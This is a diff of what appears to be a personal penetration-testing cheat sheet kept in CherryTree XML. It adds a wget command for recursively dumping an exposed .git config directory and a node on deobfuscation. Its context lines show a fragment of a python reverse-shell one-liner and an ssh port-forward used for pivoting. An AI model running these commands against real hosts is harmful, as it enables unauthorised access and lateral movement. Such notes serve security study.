@@ -282,7 +282,7 @@ Attacker:
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="os_commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394169.77" ts_lastsave="1655394196.01" unique_id="14">
 		<rich_text></rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394178.07" ts_lastsave="1656669411.42" unique_id="15">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394178.07" ts_lastsave="1656864713.82" unique_id="15">
 			<rich_text>knowing filetype
 file &lt;filename&gt;
 
@@ -422,6 +422,12 @@ apt remove --purge
 
 dpkg / .deb installer
 dpkg -i &lt;package_file&gt;.deb</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="wget" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1656864713.82" ts_lastsave="1656864729.76" unique_id="75">
+				<rich_text>wget from index page recusively
+</rich_text>
+				<rich_text family="monospace">wget -r -np -R &quot;index.html*&quot; http://example.com/configs/.</rich_text>
+				<rich_text>git</rich_text>
 			</node>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394181.49" ts_lastsave="1655649452.75" unique_id="16">
@@ -949,11 +955,13 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 </rich_text>
 		</node>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655814635.88" ts_lastsave="1656746118.89" unique_id="51">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655814635.88" ts_lastsave="1656818398.09" unique_id="51">
 		<rich_text link="webs https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</rich_text>
 		<rich_text>
 </rich_text>
 		<rich_text link="webs https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh">https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh</rich_text>
+		<rich_text>
+</rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="shell_stabilizer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655791685.61" ts_lastsave="1656222061.74" unique_id="45">
 			<rich_text>stable shell
 technique 1:
@@ -1719,6 +1727,9 @@ exit</rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="pivoting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1656313484.22" ts_lastsave="1656313486.69" unique_id="69">
 			<rich_text>sudo ssh -N -L 0.0.0.0:80:192.168.1.105:80 wtf@10.1.2.114 </rich_text>
 		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="obfuscate_deobfuscate" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1656818398.09" ts_lastsave="1656836768.77" unique_id="74">
+		<rich_text>de4jse</rich_text>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655727693.85" unique_id="19">
 		<rich_text></rich_text>
